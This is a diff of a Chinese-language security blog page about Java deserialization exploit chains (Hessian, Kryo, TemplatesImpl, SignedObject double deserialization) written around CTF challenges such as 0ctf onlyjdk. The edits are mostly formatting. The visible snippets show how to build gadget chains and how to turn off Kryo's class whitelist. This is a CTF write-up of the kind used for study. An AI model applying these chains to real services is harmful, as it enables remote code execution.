@@ -200,14 +200,14 @@
 <p>无参getter-&gt;jndi注入/TemplatesImpl.getOutputProperties代码执行/SignedObject.getObject二重反序列化</p>
 <p>不出网时，优先用TemplatesImpl.getOutputProperties，因为二重也还是需要反序列化链（sink可能还是TemplatesImpl）</p>
 <p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230808151521436.png" alt="image-20230808151521436"></p>
-<pre><code>new ToStringBean(Templates.class, getTemplates(templateName))//指定类为接口类Templates.class，可以保证有且只触发getOutputProperties，防止报错
+<h3 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h3><pre><code>new ToStringBean(Templates.class, getTemplates(templateName))//指定类为接口类Templates.class，可以保证有且只触发getOutputProperties，防止报错
 </code></pre><p>TemplatesImpl有个transient属性</p>
 <pre><code>private transient TransformerFactoryImpl _tfactory = null;
 </code></pre><p>java原生反序列化会在readObject中设置</p>
 <p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230808152422521.png" alt="image-20230808152422521"></p>
 <p>但是hessian反序列化触发getOutputProperties()过程中，该transient属性不会被设置，导致报错无法加载字节码</p>
 <p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230808152244464.png" alt="image-20230808152244464"></p>
-<p>因此需要二重反序列化，从hessian-&gt;原生反序列化来设置_tfactory</p>
+<p>因此需要二重反序列化，从hessian-&gt;SignedObject.getObject二重反序列化-&gt;原生反序列化设置_tfactory</p>
 <h2 id="0ctf-hession-onlyjdk"><a href="#0ctf-hession-onlyjdk" class="headerlink" title="0ctf hession onlyjdk"></a>0ctf hession onlyjdk</h2><p>实际上，hession可以不⽤实现java原生反序列必须的Serializable接口</p>
 <pre><code class="java">    public static byte[] hessianSer(Object argobj) throws Exception &#123;
         ByteArrayOutputStream os = new ByteArrayOutputStream();
@@ -266,7 +266,7 @@ main:64, OnlyJdk (org.example.my4unser.hessian)
 <pre><code class="java">        kryo.setRegistrationRequired(false);//关闭白名单校验
 </code></pre>
 <blockquote>
-<p>com.esotericsoftware.kryo.KryoException: Class cannot be created (missing no-arg constructor): sun.swing.SwingLazyValue<br>Serialization trace:<br>parameters (javax.activation.MimeTypeParameterList)<br>value (javax.naming.ldap.Rdn$RdnEntry)<br>    at com.esotericsoftware.kryo.util.<strong>DefaultInstantiatorStrategy</strong>.newInstantiatorOf(DefaultInstantiatorStrategy.java:111) </p>
+<p>com.esotericsoftware.kryo.KryoException: <strong>Class cannot be created (missing no-arg constructor):</strong> sun.swing.SwingLazyValue<br>Serialization trace:<br>parameters (javax.activation.MimeTypeParameterList)<br>value (javax.naming.ldap.Rdn$RdnEntry)<br>    at com.esotericsoftware.kryo.util.<strong>DefaultInstantiatorStrategy</strong>.newInstantiatorOf(DefaultInstantiatorStrategy.java:111) </p>
 <p>//kryo默认使用<strong>DefaultInstantiatorStrategy策略</strong>，反序列化需要<strong>无参构造函数</strong>，kryo通过反射调用该构造函数来实例化对象。</p>
 </blockquote>
 <p>在springcoffee题目中，可以通过设置策略为StdInstantiatorStrategy</p>
@@ -295,8 +295,7 @@ main:64, OnlyJdk (org.example.my4unser.hessian)
         super(initialCapacity, loadFactor);//Hashtable
 </code></pre>
 <p>联系前面策略的设置，猜测是策略的问题</p>
-<pre><code>kryo.setInstantiatorStrategy(new DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));
-</code></pre><pre><code class="java">    public DefaultInstantiatorStrategy(InstantiatorStrategy fallbackStrategy) &#123;
+<pre><code class="java">    public DefaultInstantiatorStrategy(InstantiatorStrategy fallbackStrategy) &#123;
         this.fallbackStrategy = fallbackStrategy;
     &#125;
 
@@ -349,7 +348,8 @@ main:64, OnlyJdk (org.example.my4unser.hessian)
         &#125;
     &#125;
 </code></pre>
-<blockquote>
+<pre><code>kryo.setInstantiatorStrategy(new DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));
+</code></pre><blockquote>
 <p>即<strong>先尝试通过无参构造函数实例化对象，如果类中没有无参构造函数，则会使用StdInstantiatorStrategy策略构造一个空属性对象</strong>。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/liuxiangke0210/article/details/78377677">https://blog.csdn.net/liuxiangke0210/article/details/78377677</a></p>
 </blockquote>
 <h3 id="hessian不会报错的原因"><a href="#hessian不会报错的原因" class="headerlink" title="hessian不会报错的原因"></a>hessian不会报错的原因</h3><pre><code>&lt;init&gt;:95, UIDefaults (javax.swing)
@@ -443,9 +443,26 @@ main:64, OnlyJdk (org.example.my4unser.hessian)
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2023/09/04/Spring%20Boot%20FatJar%20%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                </h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
         
           
-            <div class="post-nepre full next">
+            <div class="post-nepre half next">
           
             <a href="/2022/04/05/waf%E7%BB%95%E8%BF%87/" rel="next">
               <div class="background">
